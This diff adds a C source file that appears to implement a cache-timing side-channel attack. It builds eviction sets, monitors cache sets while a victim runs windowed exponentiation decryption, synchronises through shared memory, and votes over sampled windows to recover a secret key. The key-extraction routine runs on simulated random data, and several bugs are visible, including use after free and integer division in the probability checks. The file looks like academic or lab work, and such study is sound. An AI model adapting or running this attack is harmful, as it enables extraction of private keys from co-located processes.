@@ -1,0 +1,507 @@
+
+#include <sys/time.h>
+#include <stdlib.h>
+#include <time.h>
+#include "sched.h"
+#include <stdio.h>
+#include <string.h>
+#include <sys/shm.h>
+
+#include "EvictionSet.h"
+//#include "SharedData.h"
+
+#define MIN_ALLOWED_VARIANCE 200
+#define SAMPLED_KEYS_PER_WINDOW 10
+#define MAX_WINDOWS_PER_KEY (KEYS_LEN_IN_BITS / WINDOW_SIZE + 1)
+#define CACHE_SEARCH_STEP_SIZE 3
+#define MAX_ALLOWED_ERRORS 1
+
+#define PATTERN_LEN (12 + 9)
+char ZerosPattern[] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
+char OnesPattern[] = {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0};
+#define MIN_ONE_SAMPLES_IN_MULT 8
+
+#define MULT_SET_PATTERN_LEN (12 + 9 + 44)
+char ZerosMultSetPattern[] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+					0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+					0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,};
+char OnesMultSetPattern[] = {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+					0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+					0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
+
+LinesBuffer Buffer;
+Cache_Mapping EvictionSets;
+
+Cache_Statistics FirstStatistics;
+
+/*
+Cache_Statistics SecondStatistics;
+Cache_Statistics ThirdStatistics;
+Cache_Statistics DiffStatistics1, DiffStatistics2;
+*/
+
+char SetsToMonitor[SETS_IN_CACHE];
+int SetStrikes[SETS_IN_CACHE];
+
+#define MAX_SET_STRIKES 3
+
+const char *buff_to_binary(char* x, int Len, char* Result);
+char *Extract_Key(char SampledKeys[WINDOW_BUFFERS_NUM][SAMPLED_KEYS_PER_WINDOW][MAX_WINDOWS_PER_KEY]);
+
+int main()
+{
+	while (1){
+	char FakeSampledKeys[WINDOW_BUFFERS_NUM][SAMPLED_KEYS_PER_WINDOW][MAX_WINDOWS_PER_KEY];
+	Extract_Key(FakeSampledKeys);
+	}
+	exit(0);
+
+	char Input[100];
+	int SetsToMonitorNum;
+	int Set;
+	memset(&Buffer, 0, sizeof(Buffer));
+	memset(SetStrikes, 0, sizeof(SetStrikes));
+
+	// Create the shared memory for our IPC
+	// First make the key
+	key_t key;
+	int shmid;
+	sSharedMemoryData* pSharedMemory;
+
+	char PathName[100];
+	strcpy(PathName, SHM_FILE_NAME);
+	FILE* file = fopen(PathName, "w");
+
+	if (file == NULL)
+	{
+		perror("fopen");
+		exit(1);
+	}
+	fclose(file);
+
+	if ((key = ftok(SHM_FILE_NAME, SHM_PROJ_ID)) == -1) {
+		perror("ftok");
+		exit(1);
+	}
+
+	// Now make the segment
+	if ((shmid = shmget(key, SHM_SIZE, 0644 | IPC_CREAT)) == -1) {
+		perror("shmget");
+		exit(1);
+	}
+
+	// Attack to the segment to get a pointer to it
+	if ((pSharedMemory = (sSharedMemoryData*)shmat(shmid, (void *)0, 0)) == -1) {
+		perror("shmat");
+		exit(1);
+	}
+
+	// Prepare the variables inside the shared memory.
+	volatile eDecryptionState* pState = &pSharedMemory->state;
+	volatile int* pMultiplyNum = &pSharedMemory->multiplyCount;
+
+	int SetsFound = CreateEvictionSet(&Buffer, &EvictionSets);
+	printf("Total Sets found: %d\r\n", SetsFound);
+
+	printf("Activate the attacked routine and press any key\r\n");
+	scanf("%s", Input);
+
+	// Now, we must go over all sets, and filter out those which are unlikely to be usefull.
+	// We shall start by filtering out sets that are noisy.
+
+	printf("Getting memory statistics\r\n");
+	char** pSamples = GetMemoryStatistics(&EvictionSets, &FirstStatistics, 1);
+
+	WriteStatisticsToFile(&FirstStatistics, "FirstStatistics.txt", 1);
+
+	// Now find which sets are relevant
+	memset(SetsToMonitor, 1, sizeof(SetsToMonitor));
+	SetsToMonitorNum = 0;
+	int SetsDiscarded = 0;
+	int BestScore;
+	int BestSet;
+
+	for (Set = 0; Set < SetsFound; Set++)
+	{
+		// Now check if this set belongs to a multiply or square operation.
+		// If so discard it.
+		int Score;
+		char FileName[100];
+		char* ReadData;
+
+		sprintf(FileName, "Set_%d_Samples.txt", Set);
+
+		ReadData = SamplesToDataBitsArray(pSamples[Set], OnesPattern, ZerosPattern, PATTERN_LEN, CACHE_POLL_SAMPLES_PER_SET, 1, FileName, &Score, NULL);
+		free(ReadData);
+		free(pSamples[Set]);
+
+		// We found a set belonging to a multiply or square operation, discard it.
+		if (Score >= 3000) {
+			printf("Discarding set %d with score %d\r\n", Set, Score);
+			SetsToMonitor[Set] = 0;
+			SetsDiscarded++;
+
+			// Do remember however the score of the best set,
+			// we will need the square set for later.
+			if (BestScore < Score) {
+				BestScore = Score;
+				BestSet = Set;
+			}
+		}
+
+		// Too much noise -> we will not monitor
+		if ((FirstStatistics.SetStats[Set].num >= CACHE_POLL_SAMPLES_PER_SET * 0.1)) //||
+//			(FirstStatistics.SetStats[Set].variance < MIN_ALLOWED_VARIANCE))
+		{
+			SetsDiscarded++;
+			SetsToMonitor[Set] = 0;
+		}
+	}
+
+	printf("Discarded %d sets in total\r\n", SetsDiscarded);
+	free(pSamples);
+
+	printf("Set %d has the best score with %d\r\n", BestSet, BestScore);
+	printf("Moving to sync phase\r\n");
+
+	int CurrSet = 0;
+	char* Sample = NULL;
+	int ConsecutiveMisses = 0;
+	int CurrentWindow = 0;
+	char Miss;
+	char SampledKeys[WINDOW_BUFFERS_NUM][SAMPLED_KEYS_PER_WINDOW][MAX_WINDOWS_PER_KEY];
+	int SampledKeysCountPerWindow[WINDOW_BUFFERS_NUM];
+	int handledMultiplyEnding;
+
+	memset(SampledKeys, 0, sizeof(SampledKeys));
+	memset(SampledKeysCountPerWindow, 0, sizeof(SampledKeysCountPerWindow));
+
+	// Now its time to sync with the attackSyncTask, and try to find the window buffers.
+	while (1)
+	{
+		int IsBufferValid = 0;
+
+		// First we wait until the encryption restarts
+		while (*pState != DECRYPTION_ENDED) {}
+
+		// Last encryption ended, wait for the start of the next one
+		// while (*pState != DECRYPTION_STARTED) {}
+
+		ConsecutiveMisses = 0;
+		handledMultiplyEnding = 0;
+		int MaxConsecutiveMisses = 0;
+		int BestSet = 0;
+		CurrentWindow = *pMultiplyNum;
+
+		// printf("Decryption started, mult - %d\r\n", CurrentWindow);
+
+		// Encryption started, search for an active set!
+		while (*pState == DECRYPTION_STARTED || *pState == DECRYPTION_ENDED)
+		{
+			// Wait for a multiply to start
+			if (!pSharedMemory->inMultiply) {
+				CurrentWindow = *pMultiplyNum;
+				ConsecutiveMisses = 0;
+				int TmpMaxMisses = MaxConsecutiveMisses;
+				MaxConsecutiveMisses = 0;
+
+				if (*pState != DECRYPTION_STARTED || (CurrentWindow > 0 && SampledKeysCountPerWindow[CurrentWindow - 1] >= SAMPLED_KEYS_PER_WINDOW))
+					continue;
+
+				// Are we here because a multiply just ended?
+				if (!handledMultiplyEnding) {
+					handledMultiplyEnding = 1;
+
+					// printf("Potential set!, mult - %d\r\n", *pMultiplyNum);
+
+					// Was it a valid multiply operation?
+					if (!(pSharedMemory->wasLastMultiplyValid && TmpMaxMisses >= 3)) {
+						// printf("Error, validity: %d, Misses: %d\r\n", pSharedMemory->wasLastMultiplyValid, ConsecutiveMisses);
+						continue;
+					}
+				} else {
+					continue;
+				}
+			} else {
+				// Find the next relevant set
+				while (!SetsToMonitor[CurrSet] || (SetStrikes[CurrSet] > MAX_SET_STRIKES))
+				{
+					CurrSet = (CurrSet + 1) % SETS_IN_CACHE;
+				}
+
+				handledMultiplyEnding = 0;
+				Sample = PollForDataBits(&EvictionSets.Sets[CurrSet], 1);
+				Miss = (Sample[0]);
+				free(Sample);
+				ConsecutiveMisses += (Miss > 0);
+
+				if (MaxConsecutiveMisses < ConsecutiveMisses) {
+					BestSet = CurrSet;
+					MaxConsecutiveMisses = ConsecutiveMisses;
+				}
+
+				// If it isn't a miss, this set is of no interest to us.
+				if (!Miss) {
+					ConsecutiveMisses = 0;
+					CurrSet = (CurrSet + CACHE_SEARCH_STEP_SIZE) % SETS_IN_CACHE;
+				}
+
+				continue;
+			}
+
+			// If its the final multiply, then we do not know which buffer we found
+			// (It's either the last or the previous to last).
+			// We will assume it is the last and will discard it later if it matches the previous to last.
+			if (CurrentWindow == WINDOW_BUFFERS_NUM) {
+				IsBufferValid = 1;
+				break;
+			}
+
+			// At every multiply, 2 window buffers are used - the previous and the current.Now we must wait until the next multiply, and
+			// Thus, to know which did we find, we must also check the next multiply.
+			// First, lets make sure there are at least 2 zeroes between the multiplies.
+			Sample = PollForDataBits(&EvictionSets.Sets[BestSet], 1);
+			Miss = (!Sample[0]);
+			Sample = PollForDataBits(&EvictionSets.Sets[BestSet], 1);
+			Miss += (!Sample[0]);
+			Sample = PollForDataBits(&EvictionSets.Sets[BestSet], 1);
+			Miss += (!Sample[0]);
+
+			if (Miss < 2) {
+				CurrSet = (CurrSet + CACHE_SEARCH_STEP_SIZE) % SETS_IN_CACHE;
+				MaxConsecutiveMisses = 0;
+				BestSet = 0;
+				ConsecutiveMisses = 0;
+				continue;
+			}
+
+			// Start by waiting for the next multiply.
+			while (!pSharedMemory->inMultiply) {}
+
+			// Now check if the buffer is still used
+			ConsecutiveMisses = 0;
+			while (CurrentWindow == *pMultiplyNum) {
+				Sample = PollForDataBits(&EvictionSets.Sets[BestSet], 1);
+				Miss = (Sample[0]);
+				free(Sample);
+				ConsecutiveMisses += (Miss > 0);
+			}
+
+			// Check if we have enough 1 bits to assume the buffer is indeed seeing use.
+			// First we check if we are unsure about this set.
+			if (ConsecutiveMisses < MIN_ONE_SAMPLES_IN_MULT && ConsecutiveMisses > 2) {
+				CurrSet = (CurrSet + CACHE_SEARCH_STEP_SIZE) % SETS_IN_CACHE;
+				MaxConsecutiveMisses = 0;
+				BestSet = 0;
+				ConsecutiveMisses = 0;
+				continue;
+			}
+			// If we did not see it being used, the buffer belongs to the previous window.
+			else if (ConsecutiveMisses <= 2) {
+				// CurrentWindow--;
+				CurrSet = (CurrSet + CACHE_SEARCH_STEP_SIZE) % SETS_IN_CACHE;
+				MaxConsecutiveMisses = 0;
+				BestSet = 0;
+				ConsecutiveMisses = 0;
+				continue;
+			}
+
+			// printf("Found set! mult - %d\r\n", CurrentWindow);
+
+			// The buffer with the 0th multiply is of no use to us, so if it is, discard it.
+			// Also, if we already got enough samples from this window mult,
+			if (CurrentWindow == 0) {
+				CurrSet = (CurrSet + CACHE_SEARCH_STEP_SIZE) % SETS_IN_CACHE;
+				MaxConsecutiveMisses = 0;
+				BestSet = 0;
+				ConsecutiveMisses = 0;
+				continue;
+			}
+
+			// We found the window multiply!
+			IsBufferValid = 1;
+			break;
+		}
+
+		// Check if something went wrong in the start process
+		if (*pState == DECRYPTION_ERROR || *pState == DECRYPTION_ENDED)
+			continue;
+
+		// If we failed to find a relevant buffer, we must wait for the next encryption
+		if (!IsBufferValid)
+			continue;
+
+		// So we know which window we are. now wait for the actual decryption to start
+		while (*pState == DECRYPTION_STARTED) {}
+
+		int CurrMult = *pMultiplyNum;
+		int MarkedOnes = 0;
+
+		// Another test, do we have enough zeroes after the end of the preperation mults?
+		Miss = 0;
+		int i;
+
+		for (i = 0; i < 10; i++) {
+			Sample = PollForDataBits(&EvictionSets.Sets[BestSet], 1);
+			Miss += (!Sample[0]);
+		}
+
+		// The buffer with the 0th multiply is of no use to us, so if it is, discard it.
+		// Also, if we already got enough samples from this window mult,
+		if (Miss <= 8) {
+			CurrSet = (CurrSet + CACHE_SEARCH_STEP_SIZE) % SETS_IN_CACHE;
+			MaxConsecutiveMisses = 0;
+			BestSet = 0;
+			ConsecutiveMisses = 0;
+			continue;
+		}
+
+		// Wait until a new multiply operation starts, and then test to see if our
+		// window buffer is in use.
+
+		printf("Chose set %d for window %d\r\n", BestSet, CurrentWindow);
+		while (*pState == DECRYPTION_IN_PROGRESS)
+		{
+			int ErrorCount = 0;
+			ConsecutiveMisses = 0;
+			int BestMissesStreak = 0;
+
+			while (!pSharedMemory->inMultiply) {}
+			CurrMult = *pMultiplyNum;
+
+			// Make sure mult hasn't gone too high to not buffer overflow
+			if (CurrMult >= MAX_WINDOWS_PER_KEY)
+				break;
+
+			// All-right, now we count 1's until we got too many 0's
+			while (pSharedMemory->inMultiply) {
+				Sample = PollForDataBits(&EvictionSets.Sets[BestSet], 1);
+				Miss = (Sample[0]);
+				free(Sample);
+				ConsecutiveMisses = Sample[0] ? ConsecutiveMisses++ : 0;
+				BestMissesStreak = (BestMissesStreak > ConsecutiveMisses) ? BestMissesStreak : ConsecutiveMisses;
+			}
+
+			// was it a valid multiply?
+			if (!pSharedMemory->wasLastMultiplyValid) {
+				//printf("Invalid mult: %d\r\n", BestMissesStreak);
+				continue;
+			}
+
+			//printf("Valid mult: %d\r\n", BestMissesStreak);
+
+			if (CurrentWindow <= 3) {
+				//printf("Best miss streak: %d\r\n", BestMissesStreak);
+			}
+
+			// Did we find enough 1's?
+			// If so mark it in the sampling array.
+			if (BestMissesStreak >= MIN_ONE_SAMPLES_IN_MULT) {
+				SampledKeys[CurrentWindow - 1][SampledKeysCountPerWindow[CurrentWindow - 1]]
+										   [(CurrMult + 1) - WINDOW_BUFFERS_NUM] = 1;
+				MarkedOnes++;
+			}
+		}
+
+		// If no ones were found, this set is bad!
+		if (MarkedOnes > 0) {
+			SampledKeysCountPerWindow[CurrentWindow - 1]++;
+			printf("Found a key for window %d!\r\n", CurrentWindow);
+		} else {
+			SetStrikes[BestSet]++;
+
+			if (SetStrikes[BestSet] > MAX_SET_STRIKES)
+				printf("Set %d now punished!\r\n", CurrentWindow);
+		}
+
+#if 0
+		// Lets sample the set a little more to get a look at how it is.
+		char tmpBuff[100];
+		sprintf(tmpBuff, "NoiseSamples_%d.txt", BestSet);
+		FILE* pFile = fopen(tmpBuff, "w");
+		for (i = 0; i < 4000; i++) {
+			Sample = PollForDataBits(&EvictionSets.Sets[BestSet], 1);
+			fprintf(pFile, "%d", Sample[0]);
+
+			if (i % 100 == 0)
+				fprintf(pFile, "\n", Sample[0]);
+		}
+
+		fclose(pFile);
+#endif
+
+	}
+
+	// Detach from shared memory
+	shmdt(pSharedMemory);
+
+	scanf("%s", Input);
+	return 0;
+}
+
+
+
+char *Extract_Key(char SampledKeys[WINDOW_BUFFERS_NUM][SAMPLED_KEYS_PER_WINDOW][MAX_WINDOWS_PER_KEY]){
+	int windowNumber;
+	int currentWindow, currentSample;
+	float prob;
+	char generatedKey[MAX_WINDOWS_PER_KEY] = {'0'};
+	// First generate random samples
+	memset(SampledKeys, '0', WINDOW_BUFFERS_NUM * SAMPLED_KEYS_PER_WINDOW * MAX_WINDOWS_PER_KEY);
+	for (currentSample = 0; currentSample < SAMPLED_KEYS_PER_WINDOW; currentSample++){
+		for (currentWindow = 0; currentWindow < WINDOW_BUFFERS_NUM; currentWindow++){
+			for (windowNumber = 0; windowNumber < MAX_WINDOWS_PER_KEY; windowNumber++){
+				// If is the right window in the key, 90% for good sample, 10% for a bad sample
+				if ((windowNumber % WINDOW_BUFFERS_NUM) == currentWindow){
+					if (currentWindow == 0)
+						generatedKey[windowNumber] = WINDOW_BUFFERS_NUM;
+					else
+						generatedKey[windowNumber] = currentWindow;
+					prob = (rand() / RAND_MAX);
+					if (prob < 0.90)
+						SampledKeys[currentWindow][currentSample][windowNumber] = '1';
+				}
+				// If is the wrong window in the key, 90% for good sample, 10% for a bad sample
+				else{
+					prob = (rand() / RAND_MAX);
+					if (prob > 0.90)
+						SampledKeys[currentWindow][currentSample][windowNumber] = '1';
+				}
+			}
+
+		}
+	}
+
+
+	// Simple method (80% is good)
+	char Windows[WINDOW_BUFFERS_NUM][MAX_WINDOWS_PER_KEY] = {'0'};
+	char *RealKey;
+	int ones = 0;
+	RealKey = malloc(MAX_WINDOWS_PER_KEY);
+	memset(RealKey, 0, MAX_WINDOWS_PER_KEY);
+	for (currentWindow = 0; currentWindow < WINDOW_BUFFERS_NUM; currentWindow++){
+		for (windowNumber = 0; windowNumber < MAX_WINDOWS_PER_KEY; windowNumber++){
+			ones = 0;
+			for (currentSample = 0; currentSample < SAMPLED_KEYS_PER_WINDOW; currentSample++){
+				if (SampledKeys[currentWindow][currentSample][windowNumber] == '1'){
+					ones++;
+				}
+			}
+			if (ones > (SAMPLED_KEYS_PER_WINDOW * 0.5)){
+				if (RealKey[windowNumber] != 0){
+					int a;
+					a=2;
+				}
+				if (currentWindow == 0)
+					RealKey[windowNumber] = WINDOW_BUFFERS_NUM;
+				else
+					RealKey[windowNumber] = currentWindow;
+			}
+		}
+	}
+	int ans;
+	ans = memcmp(RealKey, generatedKey, MAX_WINDOWS_PER_KEY);
+	if (!ans)
+		printf("The key is CORRECT!\r\n");
+	return RealKey;
+}
